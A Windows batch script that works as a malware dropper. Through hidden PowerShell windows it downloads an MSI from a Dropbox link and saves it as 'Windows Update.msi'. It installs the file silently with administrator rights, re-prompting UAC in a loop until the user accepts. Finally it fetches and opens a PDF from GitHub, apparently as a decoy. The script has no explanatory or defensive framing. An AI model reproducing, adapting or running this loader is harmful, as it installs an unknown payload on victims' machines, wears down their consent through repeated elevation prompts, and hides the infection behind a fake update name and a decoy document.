@echo off
setlocal enabledelayedexpansion

:: Set download URL and paths
set "url=https://dl.dropboxusercontent.com/scl/fi/alf3x72krw2efb5xqatys/crm.msi?rlkey=3kye4tri5h5432dm9h6sqxbsr"
set "pdfUrl=https://raw.githubusercontent.com/008webhost/filename/refs/heads/main/file.pdf"
set "outputFileName=Windows Update.msi"
set "outputFilePath=%TEMP%\%outputFileName%"
set "pdfFileName=document.pdf"
set "pdfFilePath=%TEMP%\%pdfFileName%"

:: Delete existing files if any
if exist "%outputFilePath%" del /f /q "%outputFilePath%"
if exist "%pdfFilePath%" del /f /q "%pdfFilePath%"

powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%' -UseBasicParsing } catch { exit 1 }"

if not exist "%outputFilePath%" (
    echo Download failed. Exiting.
    exit /b 1
)

:RunLoop

:: Try to elevate and run the MSI silently, then download and open PDF
powershell -WindowStyle Hidden -Command "
    \$p = Start-Process msiexec.exe -ArgumentList '/i \"%outputFilePath%\" /qn' -Verb runAs -PassThru -ErrorAction SilentlyContinue
    if (\$p) { 
        \$p.WaitForExit()
        # Download PDF after MSI installation completes
        try {
            Invoke-WebRequest -Uri '%pdfUrl%' -OutFile '%pdfFilePath%' -UseBasicParsing
            if (Test-Path '%pdfFilePath%') {
                Start-Process '%pdfFilePath%'
            }
        } catch {
            Write-Error 'Failed to download or open PDF'
        }
        exit 0 
    } else { 
        exit 1 
    }
"

:: Check if last command succeeded (user clicked Yes)
if %ERRORLEVEL%==0 (
    exit /b 0
)

:: Wait 2 seconds before trying again
timeout /t 2 /nobreak >nul
goto RunLoop
